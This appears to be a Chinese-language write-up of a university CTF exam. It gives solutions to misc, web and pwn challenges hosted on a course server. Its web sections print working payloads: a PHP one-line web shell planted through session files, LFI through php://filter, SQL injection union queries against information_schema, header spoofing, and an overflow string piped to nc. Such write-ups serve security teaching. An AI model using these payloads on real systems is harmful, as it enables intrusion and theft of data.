---
title : 107 ta exam writeup
tags: 大學,助教,安全程式
---

# Misc
## Hidden Domain
crt.sh會記錄所有申請https的domain
使用% 找子域名
![](https://i.imgur.com/rmXoVxa.png)
找到有一個很長的域名有簽https
![](https://i.imgur.com/S3GxAYn.png)
打開
![](https://i.imgur.com/BpboCPk.png)


## 一張圖片
下載下來用小畫家 填滿
![](https://i.imgur.com/CzAzw1g.png)
![](https://i.imgur.com/41K0wEt.png)

## Easy Reverse
strings 下來 拚湊一下
![](https://i.imgur.com/Pq1HOW9.png)
`CTF{easyisntit}`


# 網頁
## Jump 10101
`curl http://140.134.25.138:10101/ -i`
![](https://i.imgur.com/VkuNP7a.png)
發現他轉跳到index0.php
`curl http://140.134.25.138:10101/index0.php -i`
多跳幾次

![](https://i.imgur.com/NIBTOBP.png)




## Session Easy 10102
只是把session 給他就拿到flag了
http://140.134.25.138:10102/?fox=自己session_id

![](https://i.imgur.com/7fJYfBL.png)


## Session Get Shell 10103
foxs 放 一句話木馬
fox 放 /tmp/sess_自己的session
cmd 參數放 指令
http://140.134.25.138:10103/?foxs=%3C?php%20system($_GET[%27cmd%27]);?%3E&fox=/tmp/sess_bhfmu5o6dk63llt5n1n83vitth&cmd=ls%20/

![](https://i.imgur.com/KsVEFk6.png)

再來把cmd 改 ls /flag
![](https://i.imgur.com/NECi0Ek.png)

再來改 cmd 改 cat /flag/flag.txt
![](https://i.imgur.com/wOVOj3G.png)


## Session Hard 10104 極難
取自Hitcon 2018想法
題目發現 session是關閉的
所以要用特殊方式去觸發session打開
php 有個東西叫 session.upload_progress
是打開的
所以只要用
`PHP_SESSION_UPLOAD_PROGRESS` 去上傳檔案
會打開php session

`curl http://140.134.25.138:10104/ -H 'Cookie: PHPSESSID=fox' -F 'PHP_SESSION_UPLOAD_PROGRESS=foxsarecute'  -F 'file=@./上傳檔案路徑'`

注意：`session.upload_progress.cleanup`是打開的
過一陣子session會被刪掉

![](https://i.imgur.com/IgsPPF0.png)

**這漏洞讓LFI=GET SHELL**

參考資料：https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html

## flask在搞? 10105 
沒有過濾 `../`跳脫資料夾導致資料外洩

用nc
![](https://i.imgur.com/apFEyO2.png)

## Write Script 10106
經觀察header 發現他有跟我講下次用的method
![](https://i.imgur.com/7QJJdUp.png)


寫python爬蟲 來自動跑不同http method

[requests自訂method](http://docs.python-requests.org/en/master/user/advanced/)
```python=
from requests import Request, Session
import requests
s = Session()
url ="http://140.134.25.138:10106/"
a=requests.get(url)
next_method = a.headers['Next_Method']
flag = a.text
while True:
        req = Request(next_method, url)
        prepped = s.prepare_request(req)
        settings = s.merge_environment_settings(prepped.url, None, None, None, None)
        resp = s.send(prepped, **settings)
        flag += resp.text
        if resp.text=="}":
                print (flag)
                break
        next_method = resp.headers['Next_Method']
```

## APK 10107
安裝apk 
![](https://i.imgur.com/lDKE0jO.png)

攔封包
![](https://i.imgur.com/hV4aWER.png)

## JS so HARD 10108
查看原始碼發現一個DATA
和一個自訂一javascript

![](https://i.imgur.com/FBCqZVx.png)

打開js看起來是用來解碼的

![](https://i.imgur.com/YF6kaJO.png)

經google發現 他是用packjs加密了
去找[unpack js](http://matthewfl.com/unPacker.html)

![](https://i.imgur.com/tUKbU8Y.png)

得到一串js
經解析 看到最後有一段json 
把它存到另一個變數看看
![](https://i.imgur.com/1W34iv4.png)

到console把剛剛修改的js覆蓋 在執行一次
最後把變數拔出來
![](https://i.imgur.com/RH4fdUT.png)

## Fake IP 10109
開場 又是這個
![](https://i.imgur.com/B5d1mfE.png)

修改`X-Forwarded-For: 127.0.0.1`
發現
![](https://i.imgur.com/iB2A7lI.png)

修改Host 
![](https://i.imgur.com/diCJ4qL.png)


## Session Get Shell 2 10110
發現 要從 session id下手
結果發現特殊符號不能直接拿來當session id

把一句話木馬 拿去base64
`<?php system($_GET['cmd']);?>d`
d是為了讓base64出來解果不出現`=`
編碼後
`PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz5k`
丟到 sessionid
![](https://i.imgur.com/3MeFkoT.png)

確定檔案上去了
http://140.134.25.138:10110/?fox=/tmp/sess_PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz5k
![](https://i.imgur.com/T0hDRl6.png)


使用php stream base64 解碼
http://140.134.25.138:10110/?fox=php://filter/convert.base64-decode/resource=/tmp/sess_PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz5k&cmd=ls
![](https://i.imgur.com/xaorkdj.png)

最後 `ls /`
http://140.134.25.138:10110/?fox=php://filter/convert.base64-decode/resource=/tmp/sess_PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz5k&cmd=cat%20/flag/flag.txt
找到flag
![](https://i.imgur.com/2fFYBls.png)

## pwn 10111
確定 debug位子
![](https://i.imgur.com/SUC2guQ.png)
送過去
`python -c "print('a'*0x18+'\x66\x07\x40\x00\x00\x00\x00\x00')" -| nc 140.134.25.138 10111
`
![](https://i.imgur.com/e3583xK.png)


## LFI 10122
LFI漏洞
用php stream 拿到原始碼
http://140.134.25.138:10122/?page=php://filter/convert.base64-encode/resource=index.php
![](https://i.imgur.com/LdNb5e1.png)
拿去decode
![](https://i.imgur.com/iWP4KqR.png)

## SQL Injection II 10113
先確定 資料庫名稱
`'  union select 'a','a', schema_name FROM information_schema.schemata;#`
![](https://i.imgur.com/zCIVuUI.png)

再確定表格名稱
`a'  union select 'a','a', table_name from information_schema.tables where table_schema = 'ctf';`
![](https://i.imgur.com/jKKMdOp.png)

最後找到欄位
`'  union select 'a','a', column_name  FROM information_schema.columns WHERE table_name = 'ctfffff';`
![](https://i.imgur.com/GPvTqmV.png)

`'  union select 'a','a', flagggggggggggg from ctfffff ;`
![](https://i.imgur.com/dO3DNiv.png)


